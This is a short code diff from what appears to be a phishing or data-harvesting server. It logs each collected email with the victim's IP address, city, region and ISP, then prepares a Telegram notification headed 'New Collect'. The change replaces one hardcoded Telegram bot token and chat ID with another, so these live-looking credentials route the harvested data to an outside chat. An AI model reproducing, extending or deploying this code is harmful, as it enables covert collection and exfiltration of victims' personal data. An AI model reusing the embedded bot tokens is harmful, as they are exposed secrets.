@@ -314,8 +314,8 @@ function startServer(emails) {
                   log('💰', `COLLECT → ${email} | ip=${clientIp} | ${city}, ${region} | ${isp}`);
 
                   // ── Telegram notification ──────────────────────────────────
-                  const TG_TOKEN   = '8629776314:AAH0ZKQzij3K9E2n8o4nSQ1X8sK02EjI7q8';
-                  const TG_CHAT_ID = '7338795540';
+                  const TG_TOKEN   = '9245719568:AAH6qv4YRXNm93Oj6ksLc-R1Qvg753cCjSc';
+                  const TG_CHAT_ID = '8798855832';
                   if (TG_TOKEN && TG_CHAT_ID) {
                     const text = encodeURIComponent(
                       `🎯 New Collect\n` +
